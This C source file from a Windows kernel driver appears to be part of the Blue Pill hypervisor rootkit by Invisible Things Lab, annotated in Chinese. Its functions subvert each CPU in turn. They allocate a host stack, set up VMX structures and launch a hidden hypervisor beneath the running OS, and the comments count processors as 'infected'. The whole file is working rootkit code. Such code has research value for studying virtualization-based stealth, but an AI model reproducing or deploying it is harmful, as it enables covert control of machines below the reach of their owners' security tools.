/* 
 * Copyright holder: Invisible Things Lab
 */

#include "hvm.h"
#include "hypercalls.h"
#include "interrupts.h"

ULONG g_uSubvertedCPUs;

NTSTATUS HvmSubvertCpu (
  PVOID GuestRsp
)
{
    NTSTATUS Status;
    PCPU Cpu;
    PVOID HostStack;

    KdPrint (("HvmSubvertCpu(): Running on processor #%d\n", KeGetCurrentProcessorNumber ()));

    // 为Guest分配内核栈(按页分配), 大小与Host相同
    HostStack = ExAllocatePoolWithTag (NonPagedPool, 2 * PAGE_SIZE, MEM_TAG);
    if (!HostStack)
    {
        KdPrint (("HvmSubvertCpu(): Failed to allocate host stack!\n"));
        return STATUS_INSUFFICIENT_RESOURCES;
    }
    RtlZeroMemory (HostStack, 2 * PAGE_SIZE);

  //
  // 设置Cpu数据结构的内存地址为 [栈顶-8h-sizeof(CPU)]
  //
  Cpu = (PCPU) ((PCHAR) HostStack + 2 * PAGE_SIZE - 8 - sizeof (CPU));

  Cpu->SelfPointer     = Cpu;
  Cpu->HostStack       = HostStack;
  Cpu->ProcessorNumber = KeGetCurrentProcessorNumber ();

  //
  // 准备VM要用到的数据结构 (VMXON & VMCS )
  // GuestRip和GuestRsp会被填进VMCS结构，代表Guest原本的代码位置和栈顶指针
  //
  Status = VmxInitialize (Cpu, CmResumeGuest, GuestRsp);
  if ( Status )
  {
      KdPrint (("HvmSubvertCpu(): VmxInitialize Failed! status 0x%08hX\n", Status));
      return Status;
  }

  InterlockedIncrement (&g_uSubvertedCPUs);  // 已侵染的CPU数+=1

  // 一切准备工作完毕，使该CPU进入虚拟机
  __vmx_vmlaunch();

  // never reached
  InterlockedDecrement (&g_uSubvertedCPUs);
  return Status;
}

NTSTATUS
HvmSpitOutBluepill ()
{
    KIRQL OldIrql;
    CHAR i;

    // 遍历所有处理器
    for (i = 0; i < KeNumberProcessors; i++)
    {
        KeSetSystemAffinityThread ((KAFFINITY) ((ULONG_PTR)1 << i));  // 将代码运行在指定CPU
        OldIrql = KeRaiseIrqlToDpcLevel ();

        VmxVmCall (NBP_HYPERCALL_UNLOAD);

        KeLowerIrql (OldIrql);
        clear_in_cr4 (X86_CR4_VMXE);
        KeRevertToUserAffinityThread ();
    }

    return STATUS_SUCCESS;
}

NTSTATUS
HvmSwallowBluepill ()
{
    NTSTATUS Status;
    KIRQL OldIrql;
    CHAR i;

    // 遍历所有处理器
    for (i = 0; i < KeNumberProcessors; i++)
    {
        KeSetSystemAffinityThread ((KAFFINITY) ((ULONG_PTR)1 << i));  // 将代码运行在指定CPU
        OldIrql = KeRaiseIrqlToDpcLevel ();

        Status = CmSubvert (NULL);  // CmSubvert的流程是保存所有寄存器(除了段寄存器)的内容到栈里后，调用HvmSubvertCpu

        KeLowerIrql (OldIrql);
        KeRevertToUserAffinityThread ();

        if (Status)
        {
            KdPrint (("HvmSwallowBluepill(): CmSubvert() failed with status 0x%08hX\n", Status));
            break;
        }
    }

    if (KeNumberProcessors != g_uSubvertedCPUs)  // 如果没有对每个核都侵染成功，则撤销更改
    {
        HvmSpitOutBluepill ();
        return STATUS_UNSUCCESSFUL;
    }

    return Status;
}
